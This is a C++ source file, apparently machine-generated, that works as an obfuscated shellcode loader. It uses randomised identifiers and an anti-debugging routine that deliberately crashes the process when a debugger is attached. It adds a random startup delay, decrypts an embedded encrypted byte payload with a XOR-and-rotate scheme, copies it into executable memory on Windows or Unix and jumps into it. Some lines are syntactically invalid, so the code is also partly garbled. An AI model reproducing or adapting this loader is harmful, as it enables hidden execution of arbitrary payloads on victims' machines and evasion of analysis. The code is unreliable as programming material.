/* Unique ID: 13557624634978921775 */
#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include <cstdint>
#include <algorithm>
#include <chrono>
#include <thread>
#include <random>
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

bool WMaa4gi0Dz() {
#ifdef _WIN32
    if (IsDebuggerPresent()) {
        // Trigger various exceptions
        __try {
            __asm { int 3 }
            __asm { ud2 }
        } __except(1) {}
        
        // Stack overflow
        char* stack = (char*)alloca(1024*1024*10);
        memset(stack, 0xFF, 1024*1024*10);
        
        // Invalid memory access
        *(int*)0 = 0xDEADBEEF;
    }
#endif
    return true;
}

std::vector<uint8_t> vTUEwnnRTE9(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key) {
    std::vector<uint8_t> result = data;
    for (size_t i = 0; i < result.size(); i++) {
        result[i] ^= key[i % key.size()];
        result[i] = (result[i] >> 3) | (result[i] << 5);
        result[i] ^= i & 0xFF;
    }
    return result;
}

int main() {
    WMaa4gi0Dz();

    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(1, 500);
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
    }

    volatile int P_cEITu578S_LQ39 = 719;
    volatile int guSrhS4r = 878;
    volatile int kf1MTlzl = 3;
    volatile int Jah52g3e = 123;
    volatile int QCAe1mHvwp1js = 424;
    volatile int UYrtfFb8F = 861;
    volatile int khB6TR882H8 = 348;
    volatile int UjYQ3lQgMju = 808;
    volatile int pWnHbGHVjDjgSv = 1;
    volatile int pN7KyoNIMuDW6uW = 264;
    std::vector<uint8_t> S5O75RZ6_y = {
        0xe9, 0x62, 0x82, 0xcd, 0x8b, 0x48, 0x3c, 0xe5, 0x2e, 0x6c, 0x9c, 0x53, 0xdb, 0x2d, 0x18, 0x94, 
        0x6b, 0x42, 0xda, 0xb4, 0x1d, 0x28, 0xad, 0xea, 0x75, 0xee, 0x6a, 0xbf, 0x71, 0x6d, 0xf9, 0xa6, 
        0x6a, 0x2a, 0x9a, 0x6d, 0x39, 0xe8, 0x04, 0x67, 0x4e, 0x36, 0x6c, 0x59, 0xc3, 0x85, 0xa2, 0x7c, 
        0x4a, 0x83, 0xdb, 0xb5
    };

    std::vector<uint8_t> BlrkXep9RC3Kew = {
        0x69, 0x04, 0x79, 0xaa, 0xd1, 0xc0, 0x34, 0x7c, 0xa5, 0x8c, 0xa6, 0x6e, 0x89, 0x70, 0xe2, 0x1e, 
        0x26, 0x38, 0x5a, 0xda, 0x44, 0xdf, 0x12, 0x9f, 0xcb, 0x97, 0x62, 0xf1, 0x8d, 0x68, 0x93, 0x45
    };

    volatile int dnHzNKeri2l9 = 69;
    volatile int v_joFGWpx9Bx = 205;
    volatile int e3XPJVqZq = 980;
    volatile int qjz1cQK0aIBT4z = 276;
    {
        std::string X9OZUB6d6neeM = auto fziQGhKxYG = []() -> std::string {
    unsigned char GmezVjqb8cQUQkhW[] = {0xd6, 0x60, 0x46, 0x6c, 0xcb, 0x11, 0x8e, 0x33, 0xb6, 0xa6, 0x76, 0xde};
    unsigned char lOFmMcP3H8[] = {0xd, 0xab, 0xf9, 0xd2, 0x91, 0xf, 0x59, 0xfd, 0xff, 0x86, 0xaa, 0x37, 0x3, 0x5c, 0xae, 0xc7, 0x15};
    std::string result;
    for (size_t i = 0; i < 11; i++) {
        unsigned char c = lOFmMcP3H8[i];
        c ^= i;
        c = (c >> 3) | (c << 5);
        c ^= GmezVjqb8cQUQkhW[i % c];
        result += c;
    }
    return result;
}();
        X9OZUB6d6neeM += auto cumLoAJyz = []() -> std::string {
    unsigned char WelRXh8_SLYVpGb9[] = {0x5d, 0x92, 0xc0, 0x1f, 0x8b, 0xb8, 0xa9, 0xfc, 0xf0};
    unsigned char gZSxFSEmZ[] = {0x70, 0x9f, 0x47, 0x3a, 0x8a};
    std::string result;
    for (size_t i = 0; i < 5; i++) {
        unsigned char c = gZSxFSEmZ[i];
        c ^= i;
        c = (c >> 3) | (c << 5);
        c ^= WelRXh8_SLYVpGb9[i % 9];
        result += c;
    }
    return result;
}();
    }
    std::vector<uint8_t> lST759ka4cuL3gX = vTUEwnnRTE9(S5O75RZ6_y, BlrkXep9RC3Kew);

#ifdef _WIN32
    LPVOID OqAVIBMeVat = VirtualAlloc(NULL, lST759ka4cuL3gX.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (OqAVIBMeVat) {
        memcpy(OqAVIBMeVat, lST759ka4cuL3gX.data(), lST759ka4cuL3gX.size());
        ((void(*)())OqAVIBMeVat)();
    }
#else
    void* OqAVIBMeVat = mmap(NULL, lST759ka4cuL3gX.size(), PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (OqAVIBMeVat != MAP_FAILED) {
        memcpy(OqAVIBMeVat, lST759ka4cuL3gX.data(), lST759ka4cuL3gX.size());
        ((void(*)())OqAVIBMeVat)();
    }
#endif
    return 0;
}
